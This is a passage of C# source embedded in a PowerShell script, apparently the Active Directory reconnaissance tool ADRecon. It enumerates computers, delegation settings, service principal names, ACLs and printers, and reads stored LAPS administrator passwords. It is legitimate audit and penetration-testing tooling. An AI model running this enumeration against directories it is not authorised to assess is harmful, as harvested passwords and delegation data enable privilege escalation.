                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Members["DistinguishedName"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", Order));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", AdSOM.Members["gPOptions"].Value));
                        SOMsList.Add( SOMObj );
                        Order--;
                    }
                    return SOMsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class PrinterRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdPrinter = (PSObject) record;

                    PSObject PrinterObj = new PSObject();
                    PrinterObj.Members.Add(new PSNoteProperty("Name", AdPrinter.Members["Name"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("ServerName", AdPrinter.Members["serverName"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("ShareName", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["printShareName"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverName", AdPrinter.Members["driverName"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverVersion", AdPrinter.Members["driverVersion"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("PortName", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["portName"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("URL", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["url"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("whenCreated", AdPrinter.Members["whenCreated"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("whenChanged", AdPrinter.Members["whenChanged"].Value));
                    return new PSObject[] { PrinterObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    bool Dormant = false;
                    bool PasswordNotChangedafterMaxAge = false;
                    string SIDHistory = "";
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;

                    if (AdComputer.Members["LastLogonDate"].Value != null)
                    {
                        //LastLogonDate = DateTime.FromFileTime((long)(AdComputer.Members["lastLogonTimeStamp"].Value));
                        // LastLogonDate is lastLogonTimeStamp converted to local time
                        LastLogonDate = Convert.ToDateTime(AdComputer.Members["LastLogonDate"].Value);
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    if (AdComputer.Members["PasswordLastSet"].Value != null)
                    {
                        //PasswordLastSet = DateTime.FromFileTime((long)(AdComputer.Members["pwdLastSet"].Value));
                        // PasswordLastSet is pwdLastSet converted to local time
                        PasswordLastSet = Convert.ToDateTime(AdComputer.Members["PasswordLastSet"].Value);
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    if ( ((bool) AdComputer.Members["TrustedForDelegation"].Value) && ((int) AdComputer.Members["primaryGroupID"].Value == 515) )
                    {
                        DelegationType = "Unconstrained";
                        DelegationServices = "Any";
                    }
                    if (AdComputer.Members["msDS-AllowedToDelegateTo"] != null)
                    {
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection delegateto = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["msDS-AllowedToDelegateTo"].Value;
                        if (delegateto.Value != null)
                        {
                            DelegationType = "Constrained";
                            foreach (var value in delegateto)
                            {
                                DelegationServices = DelegationServices + "," + Convert.ToString(value);
                            }
                            DelegationServices = DelegationServices.TrimStart(',');
                        }
                    }
                    if ((bool) AdComputer.Members["TrustedToAuthForDelegation"].Value)
                    {
                        DelegationProtocol = "Any";
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = "Kerberos";
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["SIDHistory"].Value;
                    string sids = "";
                    foreach (var value in history)
                    {
                        sids = sids + "," + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(',');
                    string OperatingSystem = CleanString((AdComputer.Members["OperatingSystem"].Value != null ? AdComputer.Members["OperatingSystem"].Value : "-") + " " + AdComputer.Members["OperatingSystemHotfix"].Value + " " + AdComputer.Members["OperatingSystemServicePack"].Value + " " + AdComputer.Members["OperatingSystemVersion"].Value);

                    PSObject ComputerObj = new PSObject();
                    ComputerObj.Members.Add(new PSNoteProperty("UserName", CleanString(AdComputer.Members["SamAccountName"].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty("Name", CleanString(AdComputer.Members["Name"].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty("DNSHostName", AdComputer.Members["DNSHostName"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Enabled", AdComputer.Members["Enabled"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("IPv4Address", AdComputer.Members["IPv4Address"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    ComputerObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    ComputerObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    ComputerObj.Members.Add(new PSNoteProperty("Primary Group ID", AdComputer.Members["primaryGroupID"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("SID", AdComputer.Members["SID"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    ComputerObj.Members.Add(new PSNoteProperty("Description", CleanString(AdComputer.Members["Description"].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty("ms-ds-CreatorSid", AdComputer.Members["ms-ds-CreatorSid"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    ComputerObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    ComputerObj.Members.Add(new PSNoteProperty("UserAccountControl", AdComputer.Members["UserAccountControl"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("whenCreated", AdComputer.Members["whenCreated"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("whenChanged", AdComputer.Members["whenChanged"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Distinguished Name", AdComputer.Members["DistinguishedName"].Value));
                    return new PSObject[] { ComputerObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["servicePrincipalName"].Value;
                    if (SPNs.Value == null)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();

                    foreach (string SPN in SPNs)
                    {
                        bool flag = true;
                        string[] SPNArray = SPN.Split('/');
                        foreach (PSObject Obj in SPNList)
                        {
                            if ( (string) Obj.Members["Service"].Value == SPNArray[0] )
                            {
                                Obj.Members["Host"].Value = string.Join(",", (Obj.Members["Host"].Value + "," + SPNArray[1]).Split(',').Distinct().ToArray());
                                flag = false;
                            }
                        }
                        if (flag)
                        {
                            PSObject ComputerSPNObj = new PSObject();
                            ComputerSPNObj.Members.Add(new PSNoteProperty("UserName", CleanString(AdComputer.Members["SamAccountName"].Value)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Name", CleanString(AdComputer.Members["Name"].Value)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                            SPNList.Add( ComputerSPNObj );
                        }
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class LAPSRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    bool PasswordStored = false;
                    DateTime? CurrentExpiration = null;
                    try
                    {
                        CurrentExpiration = DateTime.FromFileTime((long)(AdComputer.Members["ms-Mcs-AdmPwdExpirationTime"].Value));
                        PasswordStored = true;
                    }
                    catch //(Exception e)
                    {
                        //Console.WriteLine("Exception caught: {0}", e);
                    }
                    PSObject LAPSObj = new PSObject();
                    LAPSObj.Members.Add(new PSNoteProperty("Hostname", (AdComputer.Members["DNSHostName"].Value != null ? AdComputer.Members["DNSHostName"].Value : AdComputer.Members["CN"].Value )));
                    LAPSObj.Members.Add(new PSNoteProperty("Stored", PasswordStored));
                    LAPSObj.Members.Add(new PSNoteProperty("Readable", (AdComputer.Members["ms-Mcs-AdmPwd"].Value != null ? true : false)));
                    LAPSObj.Members.Add(new PSNoteProperty("Password", AdComputer.Members["ms-Mcs-AdmPwd"].Value));
                    LAPSObj.Members.Add(new PSNoteProperty("Expiration", CurrentExpiration));
                    return new PSObject[] { LAPSObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SIDRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    switch (Convert.ToString(AdObject.Members["ObjectClass"].Value))
                    {
                        case "user":
                        case "computer":
                        case "group":
                            ADWSClass.AdSIDDictionary.Add(Convert.ToString(AdObject.Members["objectsid"].Value), Convert.ToString(AdObject.Members["Name"].Value));
                            break;
                    }
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class DACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    string Name = null;
                    string Type = null;
                    List<PSObject> DACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Members["Name"].Value);

                    switch (Convert.ToString(AdObject.Members["objectClass"].Value))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Members["DisplayName"].Value);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members["objectClass"].Value);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members["ntsecuritydescriptor"] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members["ntsecuritydescriptor"].Value;
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            string Owner = Convert.ToString(DirObjSec.GetOwner(typeof(System.Security.Principal.SecurityIdentifier)));
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("AccessControlType", Rule.AccessControlType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", ADWSClass.AdSIDDictionary.ContainsKey(IdentityReference) ? ADWSClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("OwnerName", ADWSClass.AdSIDDictionary.ContainsKey(Owner) ? ADWSClass.AdSIDDictionary[Owner] : Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("Owner", Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("DistinguishedName", AdObject.Members["DistinguishedName"].Value));
                            DACLList.Add( ObjectObj );
                        }
                    }

                    return DACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

    class SACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    string Name = null;
                    string Type = null;
                    List<PSObject> SACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Members["Name"].Value);

                    switch (Convert.ToString(AdObject.Members["objectClass"].Value))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Members["DisplayName"].Value);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members["objectClass"].Value);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members["ntsecuritydescriptor"] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members["ntsecuritydescriptor"].Value;
                        AuthorizationRuleCollection AuditRules = (AuthorizationRuleCollection) DirObjSec.GetAuditRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAuditRule Rule in AuditRules)
                        {
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("AuditFlags", Rule.AuditFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandler()
            {
            }

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return processed.ToArray();
            }
        }
"@

$LDAPSource = @"
// Thanks Dennis Albuquerque for the C# multithreading code
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Xml;
using System.Net;
using System.Threading;
using System.DirectoryServices;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Management.Automation;

using System.Diagnostics;
//using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;

namespace ADRecon
{
    public static class LDAPClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<string, string> AdGroupDictionary = new Dictionary<string, string>();
        private static string DomainSID;
        private static Dictionary<string, string> AdGPODictionary = new Dictionary<string, string>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<string, string> AdSIDDictionary = new Dictionary<string, string>();
        private static readonly HashSet<string> Groups = new HashSet<string> ( new string[] {"268435456", "268435457", "536870912", "536870913"} );
        private static readonly HashSet<string> Users = new HashSet<string> ( new string[] { "805306368" } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new string[] { "805306369" }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<string> ( new string[] { "805306370" } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum GroupTypeFlags
        {
            GLOBAL_GROUP       = 2,            // 0x00000002
            DOMAIN_LOCAL_GROUP = 4,            // 0x00000004
            LOCAL_GROUP        = 4,            // 0x00000004
            UNIVERSAL_GROUP    = 8,            // 0x00000008
            SECURITY_ENABLED   = -2147483648   // 0x80000000
        }

		private static readonly Dictionary<string, string> Replacements = new Dictionary<string, string>()
        {
            //{System.Environment.NewLine, ""},
            //{",", ";"},
            {"\"", "'"}
        };

        public static string CleanString(Object StringtoClean)
        {
            // Remove extra spaces and new lines
            string CleanedString = string.Join(" ", ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (string Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static bool LAPSCheck(Object[] AdComputers)
        {
            bool LAPS = false;
            foreach (SearchResult AdComputer in AdComputers)
            {
                if (AdComputer.Properties["ms-mcs-admpwdexpirationtime"].Count == 1)
                {
                    LAPS = true;
                    return LAPS;
                }
            }
            return LAPS;
        }

        public static Object[] DomainControllerParser(Object[] AdDomainControllers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdDomainControllers, numOfThreads, "DomainControllers");
            return ADRObj;
        }

        public static Object[] SchemaParser(Object[] AdSchemas, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdSchemas, numOfThreads, "SchemaHistory");
            return ADRObj;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LDAPClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "Users");
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "UserSPNs");
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "Groups");
            return ADRObj;
        }

        public static Object[] GroupChangeParser(Object[] AdGroups, DateTime Date1, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "GroupChanges");
            return ADRObj;
        }

        public static Object[] GroupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, string DomainSID, int numOfThreads)
        {
            LDAPClass.AdGroupDictionary = new Dictionary<string, string>();
            runProcessor(AdGroups, numOfThreads, "GroupsDictionary");
            LDAPClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, "GroupMembers");
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, "OUs");
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, "GPOs");
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            LDAPClass.AdGPODictionary = new Dictionary<string, string>();
            runProcessor(AdGPOs, numOfThreads, "GPOsDictionary");
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, "SOMs");
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, "Printers");
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LDAPClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "Computers");
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "ComputerSPNs");
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "LAPS");
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.AdSIDDictionary = new Dictionary<string, string>();
            runProcessor(ADObjects, numOfThreads, "SIDDictionary");
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "DACLs");
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "SACLs");
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
                {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Array.Copy(arrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(string name)
        {
            switch (name)
            {
                case "DomainControllers":
                    return new DomainControllerRecordProcessor();
                case "SchemaHistory":
                    return new SchemaRecordProcessor();
                case "Users":
                    return new UserRecordProcessor();
                case "UserSPNs":
                    return new UserSPNRecordProcessor();
                case "Groups":
                    return new GroupRecordProcessor();
                case "GroupChanges":
                    return new GroupChangeRecordProcessor();
                case "GroupsDictionary":
                    return new GroupRecordDictionaryProcessor();
                case "GroupMembers":
                    return new GroupMemberRecordProcessor();
                case "OUs":
                    return new OURecordProcessor();
                case "GPOs":
                    return new GPORecordProcessor();
                case "GPOsDictionary":
                    return new GPORecordDictionaryProcessor();
                case "SOMs":
                    return new SOMRecordProcessor();
                case "Printers":
                    return new PrinterRecordProcessor();
                case "Computers":
                    return new ComputerRecordProcessor();
                case "ComputerSPNs":
                    return new ComputerSPNRecordProcessor();
                case "LAPS":
                    return new LAPSRecordProcessor();
                case "SIDDictionary":
                    return new SIDRecordDictionaryProcessor();
                case "DACLs":
                    return new DACLRecordProcessor();
                case "SACLs":
                    return new SACLRecordProcessor();
            }
            throw new ArgumentException("Invalid processor type " + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void processThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

        //The interface and implmentation class used to process a record (this implemmentation just returns a log type string)

        interface IRecordProcessor
        {
            PSObject[] processRecord(Object record);
        }

        class DomainControllerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    System.DirectoryServices.ActiveDirectory.DomainController AdDC = (System.DirectoryServices.ActiveDirectory.DomainController) record;
                    bool? Infra = false;
                    bool? Naming = false;
                    bool? Schema = false;
                    bool? RID = false;
                    bool? PDC = false;
                    string Domain = null;
